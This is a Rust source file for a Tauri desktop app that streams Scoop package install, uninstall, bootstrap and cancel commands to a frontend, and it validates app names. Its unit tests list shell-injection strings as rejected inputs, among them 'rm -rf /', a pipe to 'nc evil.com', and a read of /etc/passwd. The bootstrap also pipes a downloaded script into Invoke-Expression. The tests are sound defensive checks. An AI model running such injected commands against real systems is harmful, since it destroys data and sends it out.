//! Streaming wrappers around `scoop install / uninstall` plus a one-shot
//! Scoop bootstrap. Each command emits a typed `ScoopEvent` stream over a
//! `tauri::ipc::Channel` so the frontend can render terminal-style output
//! without polling.

use std::process::Stdio;

use serde::Serialize;
use tauri::ipc::Channel;
use tauri::State;
use tokio::io::{AsyncBufReadExt, BufReader};
use tokio::process::Command;

use crate::scoop::scoop_root;
use crate::state::AppState;

// ──────────────────────────────────────────────── event payload ───────────

#[derive(Serialize, Clone, Debug)]
#[serde(rename_all = "camelCase", tag = "type", content = "payload")]
pub enum ScoopEvent {
    Started { command: String },
    Stdout { line: String },
    Stderr { line: String },
    Finished { exit_code: i32 },
    Error { message: String },
}

// ──────────────────────────────────────────────── helpers ─────────────────

/// Build a powershell.exe command targeting the user's scoop.ps1 entry point.
pub(crate) fn scoop_powershell(scoop_args: &[&str]) -> Result<Command, String> {
    let root = scoop_root().ok_or_else(|| "Scoop is not installed".to_string())?;
    let scoop_ps1 = root.join("apps").join("scoop").join("current").join("bin").join("scoop.ps1");
    if !scoop_ps1.exists() {
        return Err(format!(
            "Scoop entry script not found at {}",
            scoop_ps1.display()
        ));
    }

    let mut cmd = Command::new("powershell.exe");
    cmd.arg("-NoProfile")
        .arg("-NonInteractive")
        .arg("-ExecutionPolicy")
        .arg("Bypass")
        .arg("-File")
        .arg(&scoop_ps1)
        .args(scoop_args);
    Ok(cmd)
}

/// Build a powershell.exe command running an inline script. Used for the
/// Scoop bootstrap (no scoop.ps1 yet).
fn powershell_inline(script: &str) -> Command {
    let mut cmd = Command::new("powershell.exe");
    cmd.arg("-NoProfile")
        .arg("-NonInteractive")
        .arg("-ExecutionPolicy")
        .arg("Bypass")
        .arg("-Command")
        .arg(script);
    cmd
}

/// Spawn a `Command`, wire stdout+stderr to a streaming `Channel`, and resolve
/// once the child exits. Caller is responsible for any post-completion
/// state mutation (cache refresh, etc.).
pub(crate) async fn drive(
    mut cmd: Command,
    on_event: &Channel<ScoopEvent>,
    state: &State<'_, AppState>,
    label: &str,
) -> Result<i32, String> {
    cmd.stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .stdin(Stdio::null());

    // Hide the spawned console window on Windows.
    #[cfg(windows)]
    {
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        cmd.creation_flags(CREATE_NO_WINDOW);
    }

    let _ = on_event.send(ScoopEvent::Started {
        command: label.to_string(),
    });

    let mut child = cmd.spawn().map_err(|e| e.to_string())?;
    let pid = child.id();

    if let Some(pid) = pid {
        *state.running_pid.lock() = Some(pid);
    }

    // Helper to ensure we clear PID before propagating any error after spawn.
    let stdout = match child.stdout.take() {
        Some(s) => s,
        None => {
            *state.running_pid.lock() = None;
            return Err("failed to capture stdout".into());
        }
    };
    let stderr = match child.stderr.take() {
        Some(s) => s,
        None => {
            *state.running_pid.lock() = None;
            return Err("failed to capture stderr".into());
        }
    };

    let stdout_chan = on_event.clone();
    let stdout_task = tokio::spawn(async move {
        let mut lines = BufReader::new(stdout).lines();
        while let Ok(Some(line)) = lines.next_line().await {
            let _ = stdout_chan.send(ScoopEvent::Stdout { line });
        }
    });

    let stderr_chan = on_event.clone();
    let stderr_task = tokio::spawn(async move {
        let mut lines = BufReader::new(stderr).lines();
        while let Ok(Some(line)) = lines.next_line().await {
            let _ = stderr_chan.send(ScoopEvent::Stderr { line });
        }
    });

    let wait_result = child.wait().await;
    let _ = stdout_task.await;
    let _ = stderr_task.await;

    // Always clear PID before returning, even on wait() failure, otherwise
    // a stale PID would block future operations.
    *state.running_pid.lock() = None;

    let status = wait_result.map_err(|e| e.to_string())?;
    Ok(status.code().unwrap_or(-1))
}

/// Validate that `app_name` looks like a Scoop app reference (optionally
/// `bucket/name`). Rejects anything containing whitespace, semicolons, pipes,
/// quotes, ampersands, or other shell metacharacters.
fn validate_app_ref(app: &str) -> Result<(), String> {
    if app.is_empty() {
        return Err("app name cannot be empty".into());
    }
    let allowed =
        |c: char| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '+' | '@' | '/');
    if !app.chars().all(allowed) {
        return Err(format!("invalid app name: {app:?}"));
    }
    Ok(())
}

// ──────────────────────────────────────────────── commands ────────────────

#[tauri::command]
pub async fn scoop_install(
    app: String,
    on_event: Channel<ScoopEvent>,
    state: State<'_, AppState>,
) -> Result<(), String> {
    if state.running_pid.lock().is_some() {
        let msg = "another scoop operation is already running".to_string();
        let _ = on_event.send(ScoopEvent::Error {
            message: msg.clone(),
        });
        return Err(msg);
    }
    if let Err(e) = validate_app_ref(&app) {
        let _ = on_event.send(ScoopEvent::Error {
            message: e.clone(),
        });
        return Err(e);
    }

    let cmd = match scoop_powershell(&["install", &app]) {
        Ok(c) => c,
        Err(e) => {
            let _ = on_event.send(ScoopEvent::Error {
                message: e.clone(),
            });
            return Err(e);
        }
    };
    let label = format!("scoop install {app}");
    let exit_code = drive(cmd, &on_event, &state, &label).await?;
    let _ = on_event.send(ScoopEvent::Finished { exit_code });

    // Whether install succeeded or failed, the on-disk state may have changed.
    state.catalog.refresh();
    Ok(())
}

#[tauri::command]
pub async fn scoop_uninstall(
    app: String,
    on_event: Channel<ScoopEvent>,
    state: State<'_, AppState>,
) -> Result<(), String> {
    if state.running_pid.lock().is_some() {
        let msg = "another scoop operation is already running".to_string();
        let _ = on_event.send(ScoopEvent::Error {
            message: msg.clone(),
        });
        return Err(msg);
    }
    if let Err(e) = validate_app_ref(&app) {
        let _ = on_event.send(ScoopEvent::Error {
            message: e.clone(),
        });
        return Err(e);
    }

    let cmd = match scoop_powershell(&["uninstall", &app]) {
        Ok(c) => c,
        Err(e) => {
            let _ = on_event.send(ScoopEvent::Error {
                message: e.clone(),
            });
            return Err(e);
        }
    };
    let label = format!("scoop uninstall {app}");
    let exit_code = drive(cmd, &on_event, &state, &label).await?;
    let _ = on_event.send(ScoopEvent::Finished { exit_code });

    state.catalog.refresh();
    Ok(())
}

#[tauri::command]
pub async fn scoop_bootstrap(
    on_event: Channel<ScoopEvent>,
    state: State<'_, AppState>,
) -> Result<(), String> {
    if state.running_pid.lock().is_some() {
        let msg = "another scoop operation is already running".to_string();
        let _ = on_event.send(ScoopEvent::Error {
            message: msg.clone(),
        });
        return Err(msg);
    }

    // The official one-liner. -Force on Set-ExecutionPolicy keeps it from
    // prompting the user when the policy is already RemoteSigned.
    let script = "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser -Force; \
                  Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression";
    let cmd = powershell_inline(script);
    let exit_code = drive(cmd, &on_event, &state, "scoop bootstrap").await?;
    let _ = on_event.send(ScoopEvent::Finished { exit_code });

    state.catalog.refresh();
    Ok(())
}

/// Cancel the in-flight scoop operation, if any. Sends `taskkill /T /F /PID`
/// so PowerShell + scoop subprocesses are killed too. Returns true if a
/// process was cancelled. Bumps cancellation_gen so multi-step orchestrations
/// (preset apply) can detect that they should abort.
#[tauri::command]
pub async fn scoop_cancel(state: State<'_, AppState>) -> Result<bool, String> {
    state
        .cancellation_gen
        .fetch_add(1, std::sync::atomic::Ordering::SeqCst);

    let pid = { state.running_pid.lock().take() };
    let Some(pid) = pid else {
        return Ok(false);
    };

    let mut kill = Command::new("taskkill");
    kill.args(["/T", "/F", "/PID", &pid.to_string()])
        .stdout(Stdio::null())
        .stderr(Stdio::null());

    #[cfg(windows)]
    {
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        kill.creation_flags(CREATE_NO_WINDOW);
    }

    let _ = kill.status().await;
    Ok(true)
}

#[cfg(test)]
mod tests {
    use super::validate_app_ref;

    #[test]
    fn accepts_plain_app_names() {
        assert!(validate_app_ref("redis").is_ok());
        assert!(validate_app_ref("postgresql").is_ok());
        assert!(validate_app_ref("mysql-lts").is_ok());
        assert!(validate_app_ref("mongodb-database-tools").is_ok());
        assert!(validate_app_ref("nodejs18").is_ok());
    }

    #[test]
    fn accepts_bucket_qualified_names() {
        assert!(validate_app_ref("main/redis").is_ok());
        assert!(validate_app_ref("extras/memurai").is_ok());
    }

    #[test]
    fn rejects_shell_metacharacters() {
        for evil in [
            "redis; rm -rf /",
            "redis && malicious",
            "redis | nc evil.com 80",
            "redis`whoami`",
            "redis$(whoami)",
            "redis\"; bad",
            "redis'; bad",
            "redis & bad",
            "redis > out.txt",
            "redis < /etc/passwd",
            "redis\n# more",
            "redis #comment",
        ] {
            assert!(
                validate_app_ref(evil).is_err(),
                "should have rejected: {evil:?}"
            );
        }
    }

    #[test]
    fn rejects_empty() {
        assert!(validate_app_ref("").is_err());
    }
}

